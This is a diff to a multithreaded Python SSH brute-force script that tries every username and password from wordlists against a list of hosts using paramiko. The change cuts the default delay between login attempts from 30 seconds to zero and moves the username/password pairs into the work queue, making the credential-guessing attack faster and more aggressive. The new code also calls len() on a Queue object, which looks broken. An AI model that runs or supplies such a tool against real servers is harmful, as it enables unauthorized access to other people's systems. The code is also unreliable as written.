@@ -8,7 +8,7 @@ from time import sleep
 
 parser = argparse.ArgumentParser(description='Bruteforce ssh by list of passwords and usernames',
                                  epilog="Hello PowerLifter")
-parser.add_argument('-i', type=int, default=30, help='interval between connections(default: 30 sec)')
+parser.add_argument('-i', type=int, default=0, help='interval between connections(default: 0 sec)')
 parser.add_argument('-p', type=int, default=22, help='port to connect to(default: 22)')
 parser.add_argument('--usernames', default="srnms", type=argparse.FileType("r"), help='file with usernames(default: srnms)')
 parser.add_argument('--passwords', default="pswds", type=argparse.FileType("r"), help='file with passwords(default: pswds)')
@@ -16,15 +16,15 @@ parser.add_argument('--hosts', default="hsts", type=argparse.FileType("r"), help
 parser.add_argument('--threadnum', type=int, default="4", help='number of threads(default: 4)')
 
 args = parser.parse_args()
-users = []
-passwords = []
-combos = []
+users = list()
+passwords = list()
+hosts = list()
 
 
 def worker(queue):
     while True:
-        host = queue.get()
-        for user, pwd in combos:
+        user, pwd = queue.get()
+        for host in hosts:
             try:
                 ssh = paramiko.SSHClient()
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -39,11 +39,14 @@ def worker(queue):
 
 
 def main():
+    global users, passwords, hosts
+
+    # create Queue(thread-safe)
     queue = Queue()
 
     # read hosts to thread-safe queue
     for hostline in args.hosts:
-        queue.put(hostline.strip())
+        hosts.append(hostline.strip())
 
     # read all usernames
     for usrline in args.usernames:
@@ -53,13 +56,16 @@ def main():
     for pwdline in args.passwords:
         passwords.append(pwdline.strip())
 
-    # create all combinations of usernames and passwords
-    global combos
-    combos = [combo for combo in itertools.product(users, passwords)]
+    # put all combinations of usernames and passwords to queue
+    for combo in itertools.product(users, passwords):
+        queue.put(combo)
+
+    # free some memory in case lists are big
+    del users, passwords
 
     # go threads
-    if args.threadnum > len(combos):
-        args.threadnum = len(combos)
+    if args.threadnum > len(queue):
+        args.threadnum = len(queue)
 
     for i in range(args.threadnum):
         t = Thread(target=worker, args=(queue,))
